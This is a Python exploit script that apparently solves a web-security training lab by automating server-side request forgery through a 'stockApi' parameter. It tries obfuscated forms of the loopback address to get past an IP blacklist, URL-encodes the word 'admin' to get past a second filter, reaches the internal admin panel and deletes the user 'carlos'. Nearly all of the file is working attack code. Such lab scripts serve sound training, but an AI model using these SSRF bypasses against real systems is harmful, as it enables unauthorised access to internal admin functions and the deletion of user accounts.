import sys
import requests
import urllib3
import urllib
import click
import colorama
from colorama import init,Fore


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

stock_path = '/product/stock'

def ip_blacklist_bypass(url):
    
    print(Fore.YELLOW+"[*] Trying to bypass the first blacklist filter...")
    payloads={
        '127.0.0.1',
        '2130706433',
        '017700000001',
        '127.1'
    }
    valid_ip=''
    for payload in payloads:
        ip_address = 'http://%s/'%payload
        parameter = {'stockApi':ip_address}
        
        request=requests.post(url+stock_path,data=parameter,verify=False)
        
        if "Admin panel" in request.text:
            valid_ip+=ip_address
            print(Fore.BLUE+f"[+] Found a working payload: {ip_address}")
            print(Fore.BLUE+"[+] Found the Admin Panel in the response")
            
    admin_page_bypass(url,valid_ip)


def admin_page_bypass(url,valid_ip):
    admin_path='admin'
    admin_uri=valid_ip+admin_path
    parameter={'stockApi':f'{admin_uri}'}
    payload=''
    
    request=requests.post(url+stock_path,data=parameter,verify=False)
    
    print(Fore.YELLOW+f"[*] Now trying to access the Admin Panel at {admin_uri}")
    
    if "Carlos" in request.text:
        payload+=admin_uri
        print(Fore.BLUE+"[+] The Admin Panel is accessible")
        exploit(url,payload)
    else:
        print(Fore.RED+"[!] Failed to access the Admin Panel")
        print(Fore.YELLOW+"[*] Trying to bypass the second blacklist filter by URL encoding the admin page...")
        
        #URL encoding the 'admin' string
        admin_path_enc = ''.join(f'%{b:02X}' for b in admin_path.encode('utf-8'))
        
        admin_uri_enc=valid_ip+admin_path_enc
        enc_parameter={'stockApi':f'{admin_uri_enc}'}
        
        enc_request=requests.post(url+stock_path,data=enc_parameter,verify=False)
        
        if "Admin panel" in enc_request.text:
            print(Fore.BLUE+"[+] Successfully bypassed the filter and the Admin Panel is now accessible")
            payload+=admin_uri_enc
            exploit(url,payload)
        else:
            print(Fore.RED+"[!] something went wrong")
        
        
def exploit(url,enc_payload):
    print(Fore.YELLOW+"[*] attempting to delete the user Carlos...")
    
    user_del='/delete?username=carlos'
    exploit_parameter = {'stockApi':enc_payload+user_del}
    exploit_request = requests.post(url+stock_path,data=exploit_parameter,verify=False)
    
    #Checking if the user got deleted
    check_parameter = {'stockApi':enc_payload}
    
    check_request = requests.post(url+stock_path,data=check_parameter,verify=False)
    
    if 'User deleted successfully!' in check_request.text:
        print(Fore.GREEN+"[+] The user Carlos has successfully been deleted, and the lab has been solved!")
    else:
        print(Fore.RED+"[-] The unforunate happened :((")


@click.command()
@click.option('-u','--url',type=str,prompt='The URL of the Target', required=True,help='The vulnerable URL of the target')
def main(url):
    ip_blacklist_bypass(url)


if __name__=='__main__':
    main()